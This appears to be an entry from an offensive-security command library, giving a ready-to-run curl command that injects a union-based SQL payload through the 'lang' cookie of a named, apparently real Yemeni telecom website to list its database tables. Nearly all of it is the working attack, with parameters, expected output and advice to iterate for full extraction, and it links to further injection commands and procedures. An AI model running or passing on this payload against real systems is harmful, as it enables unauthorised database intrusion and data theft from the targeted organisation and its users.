---
id: cmd-mtn-table-sqli
data: >-
  curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" -H
  "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=' UNION SELECT
  table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- ;
  _ga=GA1.3.1859249834.1576704214" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu;
  Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
tags:
  - sqli
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.170Z'
verified: false
validated: true
submitted: true
---
# sqli-table-extraction

## Command

```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- ; _ga=GA1.3.1859249834.1576704214" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

## Description

Extracts database table names via union-based SQLi in lang cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `lang=' UNION ...--` | Union payload for schema dump | Yes |

## Examples

### Basic Usage

As above; iterate for full extraction.

## Expected Output

Table names in response or errors.

## Related

- [[commands/sqli-time-based-blind]]
- [[procedures/Extract-Database-Tables-via-SQL-Injection]]
